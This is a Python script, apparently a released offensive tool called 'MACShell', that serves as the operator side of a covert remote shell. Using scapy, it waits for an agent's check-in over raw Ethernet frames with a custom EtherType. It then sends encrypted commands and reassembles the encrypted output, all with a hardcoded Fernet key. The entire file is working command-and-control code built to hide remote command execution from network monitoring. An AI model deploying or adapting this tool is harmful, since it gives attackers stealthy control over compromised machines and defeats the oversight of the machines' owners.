#!/usr/bin/env python3

# Print banner at runtime
banner = """
███╗   ███╗ █████╗  ██████╗███████╗██╗  ██╗███████╗██╗     ██╗     
████╗ ████║██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
██╔████╔██║███████║██║     ███████╗███████║█████╗  ██║     ██║     
██║╚██╔╝██║██╔══██║██║     ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║ ╚═╝ ██║██║  ██║╚██████╗███████║██║  ██║███████╗███████╗███████╗
╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

          MACShell Server – Covert Shell over MAC
                    Made by Khaled Al-Refaee V0.1
"""
print(banner)

import threading
import queue
from scapy.all import *
from cryptography.fernet import Fernet

# Network interface to listen on
iface = "eth0"

# Variable to store the agent's MAC address after it checks in
agent_mac = None

# Thread-safe queue to collect incoming response packets
response_queue = queue.Queue()

# AES key (must match agent's key)
key = b"q3yHiYdGNwFqkugDaG9f6_PRAolbQkAe6bQYRE3GE9s="
fernet = Fernet(key)

print("[*] Waiting for agent to check in (EtherType 0x1234)...")

# === Step 1: Wait for the "hello" packet from the agent ===
def discover(pkt):
    global agent_mac
    if pkt.haslayer(Ether) and pkt.haslayer(Raw):
        # Check for EtherType and "hello" payload
        if pkt[Ether].type == 0x1234 and pkt[Raw].load.startswith(b"hello"):
            agent_mac = pkt[Ether].src
            print(f"[+] Agent connected from {agent_mac}")
            return True
    return False

# Listen for the first packet from the agent (timeout = 15s)
sniff(iface=iface, filter="ether proto 0x1234", prn=discover, timeout=15)

# Exit if no check-in from agent
if not agent_mac:
    print("[!] No agent check-in received.")
    exit(1)

print("[*] Agent check-in complete. Starting interactive shell...\n")

# === Step 2: Background thread to sniff agent responses ===
def sniff_responses():
    def is_response(pkt):
        return (
            pkt.haslayer(Ether)
            and pkt.haslayer(Raw)
            and pkt[Ether].type == 0x1234
            and pkt[Ether].src.lower() == agent_mac.lower()
        )

    # Continuously listen for response packets from the agent
    sniff(iface=iface, lfilter=is_response, store=0, prn=lambda pkt: response_queue.put(pkt))

# Start the background sniffer thread (daemon so it exits with the main script)
threading.Thread(target=sniff_responses, daemon=True).start()

# === Step 3: Interactive shell loop ===
while True:
    try:
        cmd = input("agent> ").strip()
        if not cmd:
            continue  # Skip empty commands

        # Encrypt the command using Fernet
        encrypted_cmd = fernet.encrypt(cmd.encode())

        # Create the Ethernet frame with encrypted payload
        pkt = Ether(dst=agent_mac, src=get_if_hwaddr(iface), type=0x1234) / Raw(load=encrypted_cmd)

        print(f"[DEBUG] Sending to {agent_mac} from {get_if_hwaddr(iface)}: {cmd}")
        sendp(pkt, iface=iface, verbose=False)

        # === Step 4: Handle multi-chunk responses ===
        full_output = ""
        while True:
            try:
                # Wait for the next response packet
                response_pkt = response_queue.get(timeout=5)
                payload = response_pkt[Raw].load

                # Check if it's a mid or end chunk
                if payload.startswith(b"[MID]"):
                    chunk = payload[5:]
                    full_output += fernet.decrypt(chunk).decode(errors="ignore")
                elif payload.startswith(b"[END]"):
                    chunk = payload[5:]
                    full_output += fernet.decrypt(chunk).decode(errors="ignore")
                    print(full_output)  # Print the full response
                    break
                else:
                    print("[!] Unknown packet format.")
            except queue.Empty:
                print("[!] No response received.")
                break
            except Exception as e:
                print(f"[!] Decryption error: {e}")
                break

    except KeyboardInterrupt:
        print("\n[!] Server exiting.")
        break
